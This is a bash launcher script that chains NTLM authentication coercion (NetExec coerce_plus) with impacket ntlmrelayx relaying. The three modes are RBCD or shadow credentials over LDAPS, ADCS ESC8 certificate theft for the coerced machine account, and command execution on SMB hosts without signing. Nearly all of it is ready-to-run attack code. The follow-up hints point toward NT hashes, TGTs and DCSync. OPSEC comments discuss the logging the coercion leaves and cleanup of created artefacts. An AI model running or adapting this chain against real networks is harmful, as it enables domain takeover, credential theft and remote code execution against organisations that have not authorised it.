#!/usr/bin/env bash
# coerce_relay_chain.sh - Coercion + NTLM/Kerberos relay chain launcher.
#
# Sets up an ntlmrelayx listener for the chosen target type, then coerces the
# victim (NetExec coerce_plus, all methods) to authenticate to the relay. Used for:
#   ldap  -> RBCD / shadow credentials on a writable computer
#   adcs  -> ESC8 certificate as the coerced machine account
#   smb   -> command exec on a signing:False target
#
# Usage:
#   ./coerce_relay_chain.sh <domain> <user> <password> <victim_ip> <relay_ip> <mode> [extra]
#     mode = ldap | adcs | smb
#     ldap extra  = LDAP target FQDN              (default dc01.<domain>)
#     adcs extra  = CA cert endpoint URL          (default http://ca/certsrv/certfnsh.asp)
#     smb  extra  = command to run                (default 'whoami')
#
# Examples:
#   ./coerce_relay_chain.sh corp.local user 'Pass' 10.0.0.10 10.0.0.50 adcs http://ca01.corp.local/certsrv/certfnsh.asp
#   ./coerce_relay_chain.sh corp.local user 'Pass' 10.0.0.10 10.0.0.50 ldap dc01.corp.local
#
# Dependencies: impacket (ntlmrelayx.py), netexec (nxc).  Run relay as root if binding 445/80.
# OPSEC: check signing first (nxc smb --gen-relay-list / -M ldap-checker). Coercion is logged
#        via RPC named-pipe events (5145). Clean up created machine accts / shadow creds / certs.
set -euo pipefail

DOMAIN="${1:?domain}"; USER="${2:?user}"; PASS="${3:?password}"
VICTIM="${4:?victim_ip}"; RELAY="${5:?relay_ip}"; MODE="${6:?mode ldap|adcs|smb}"
EXTRA="${7:-}"

RELAYX="$(command -v ntlmrelayx.py || echo impacket-ntlmrelayx)"
NXC="$(command -v nxc || command -v netexec || echo nxc)"

case "$MODE" in
  ldap)
    TGT="${EXTRA:-dc01.${DOMAIN}}"
    echo "[*] ntlmrelayx -> ldaps://${TGT} (--delegate-access creates a machine acct for RBCD)"
    RELAY_CMD=("$RELAYX" -t "ldaps://${TGT}" --delegate-access --no-smb-server -smb2support)
    ;;
  adcs)
    TGT="${EXTRA:-http://ca/certsrv/certfnsh.asp}"
    echo "[*] ntlmrelayx -> ADCS ${TGT} (ESC8, template DomainController)"
    RELAY_CMD=("$RELAYX" -t "$TGT" -smb2support --adcs --template DomainController)
    ;;
  smb)
    CMD="${EXTRA:-whoami}"
    echo "[*] ntlmrelayx -> SMB ${VICTIM} exec '${CMD}' (needs signing:False)"
    RELAY_CMD=("$RELAYX" -t "smb://${VICTIM}" -smb2support -c "$CMD")
    ;;
  *) echo "[-] mode must be ldap|adcs|smb"; exit 1;;
esac

echo "[*] Starting relay listener in background..."
"${RELAY_CMD[@]}" > relay.log 2>&1 &
RELAY_PID=$!
trap 'echo "[*] stopping relay $RELAY_PID"; kill "$RELAY_PID" 2>/dev/null || true' EXIT
sleep 3
echo "[*] Relay PID ${RELAY_PID}; log -> relay.log"

echo "[*] Coercing ${VICTIM} -> ${RELAY} via coerce_plus (all methods, stop on success)"
"$NXC" smb "$VICTIM" -u "$USER" -p "$PASS" -d "$DOMAIN" \
  -M coerce_plus -o "LISTENER=${RELAY}" "METHOD=all" || true

echo "[*] Coercion fired. Watching relay.log for 60s (Ctrl-C to keep watching)..."
timeout 60 tail -f relay.log || true

echo "[i] Follow-up:"
case "$MODE" in
  ldap) echo "    -> RBCD/shadow cred set on target; use rbcd_takeover.py getST or certipy shadow";;
  adcs) echo "    -> certipy auth -pfx <machine>.pfx -dc-ip ${VICTIM}   (=> NT hash / TGT => DCSync)";;
  smb)  echo "    -> command output is in relay.log";;
esac
